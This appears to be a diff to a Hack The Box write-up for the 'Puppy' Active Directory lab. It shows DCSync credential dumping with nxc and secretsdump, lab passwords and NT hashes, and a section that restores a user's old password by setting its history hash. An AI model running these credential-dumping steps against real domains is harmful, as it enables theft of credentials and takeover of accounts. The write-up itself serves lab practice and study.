@@ -1162,23 +1162,23 @@ SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\steph.cooper_a
 
 ### DCSync
 
-Since `steph.cooper_adm` is in the `Administrators` group, we can **DCSync** to get `Administrator`'s hashes
+Since `steph.cooper_adm` is in the `Administrators` group, we can **DCSync** to get `Administrator`'s NT hash
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Puppy]
-└─$ pt set user 'steph.cooper_ad'; pt set pass 'FivethChipOnItsWay2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
-steph.cooper_ad:FivethChipOnItsWay2025!
+└─$ pt set user 'steph.cooper_adm'; pt set pass 'FivethChipOnItsWay2025!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
+steph.cooper_adm:FivethChipOnItsWay2025!
 
 ┌──(bravosec㉿fsociety)-[~/htb/Puppy]
-└─$ nxc smb $(pt get dc_fqdn) -k -u "$(pt get user)" -p "$(pt get pass)" --ntds --user Administrator --log nxc_ntds.log
-SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
+└─$ nxc smb $(pt get dc_fqdn) -k -u "$(pt get user)" -p "$(pt get pass)" --log nxc_ntds.log --ntds --user Administrator
+SMB         DC.PUPPY.HTB    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
 SMB         DC.PUPPY.HTB    445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! (Pwn3d!)
 SMB         DC.PUPPY.HTB    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
 SMB         DC.PUPPY.HTB    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
-SMB         DC.PUPPY.HTB    445    DC               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/DC_DC.PUPPY.HTB_2025-05-26_190030.ntds of which 1 were added to the database
+SMB         DC.PUPPY.HTB    445    DC               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds of which 1 were added to the database
 SMB         DC.PUPPY.HTB    445    DC               [*] To extract only enabled accounts from the output file, run the following command:
-SMB         DC.PUPPY.HTB    445    DC               [*] cat /home/kali/.nxc/logs/DC_DC.PUPPY.HTB_2025-05-26_190030.ntds | grep -iv disabled | cut -d ':' -f1
-SMB         DC.PUPPY.HTB    445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/DC_DC.PUPPY.HTB_2025-05-26_190030.ntds | cut -d ':' -f1
+SMB         DC.PUPPY.HTB    445    DC               [*] cat /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         DC.PUPPY.HTB    445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC.PUPPY.HTB_None_2025-09-30_031434.ntds | cut -d ':' -f1
 ```
 
 
@@ -1350,6 +1350,25 @@ whoami
 cat C:\Users\Administrator\Desktop\root.txt
 ```
 
+```bash
+PS C:\> cat C:\Users\Administrator\Documents\CLNP\revert.ps1
+# Not part of the box, DO NOT TAMPER!
+
+Import-Module ActiveDirectory
+
+$username = "adam.silver"
+$newPassword = "KingdomMagic2025!"
+
+# Remove the user from the developer's group, reverting part 1 of the attack vector:
+Remove-ADGroupMember -Identity DEVELOPERS -Members levi.james -Confirm:$false
+
+# Reset the password and disable the account, reverting part 2 of the attack vector:
+Set-LocalUser -Name $username -Password (ConvertTo-SecureString -AsPlainText $newPassword -Force)
+Disable-LocalUser -Name $username
+
+# Gracefully finish!
+```
+
 
 ### Client side activities
 
@@ -1379,4 +1398,65 @@ cat C:\Users\Administrator\Desktop\root.txt
 
 ```bash
 
+```
+
+
+## Revert to user's previous passwords via setting NTLM hash
+
+> This idea came up after watching [Beyond Root section from Ippsec's video](https://youtu.be/QZQ-IjsI5Qk?t=2565&si=zNT_QFRaOlFrTonl) for this machine.
+> 
+> Since AD has no built-in function to revert users' password to previous ones, and I know an AD security solution product called **Semperis DSP** that can make it happen, I started to wonder how it works.
+{: .prompt-info }
+
+1. Change `adam.silver`'s password
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Puppy]
+└─$ bloodyAD --host DC.PUPPY.HTB -d PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' set password adam.silver 'Bravosec1337!'
+[+] Password changed successfully!
+```
+
+2. Dump `adam.silver`'s history passwords from **NTDS**
+
+- The plaintext of current NT hash `4ff50deb62abb56d811389eea639ee96` is `Bravosec1337!`, and the plaintext of old NT hash `a7d7c07487ba2a4b32fb1d0953812d66` is `KingdomMagic2025!`
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Puppy]
+└─$ secretsdump.py puppy.htb/steph.cooper_adm:'FivethChipOnItsWay2025!'@DC.PUPPY.HTB -history -just-dc-user adam.silver
+Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:4ff50deb62abb56d811389eea639ee96:::
+PUPPY.HTB\adam.silver_history0:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
+PUPPY.HTB\adam.silver_history1:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
+PUPPY.HTB\adam.silver_history2:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
+PUPPY.HTB\adam.silver_history3:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
+[...]
+```
+
+3. Change `adam.silver`'s password back to `KingdomMagic2025!` by supplying NT hash
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Puppy]
+└─$ changepasswd.py 'puppy.htb'/'adam.silver'@'DC.PUPPY.HTB' -altuser 'steph.cooper_adm' -altpass 'FivethChipOnItsWay2025!' -reset -newhashes 0:a7d7c07487ba2a4b32fb1d0953812d66
+Impacket v0.13.0.dev0+20250926.155809.77988233 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Setting the password of puppy.htb\adam.silver as puppy.htb\steph.cooper_adm
+[*] Connecting to DCE/RPC as puppy.htb\steph.cooper_adm
+[*] Password was changed successfully.
+[!] User no longer has valid AES keys for Kerberos, until they change their password again.
+```
+
+4. Validated that password change was successful
+
+```bash
+┌──(bravosec㉿fsociety)-[~/htb/Puppy]
+└─$ bloodyAD --host DC.PUPPY.HTB -d PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' remove uac 'adam.silver' -f 'ACCOUNTDISABLE'
+[+] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
+
+┌──(bravosec㉿fsociety)-[~/htb/Puppy]
+└─$ nxc smb DC.PUPPY.HTB -u 'adam.silver' -p 'KingdomMagic2025!'
+SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\adam.silver:KingdomMagic2025!
 ```
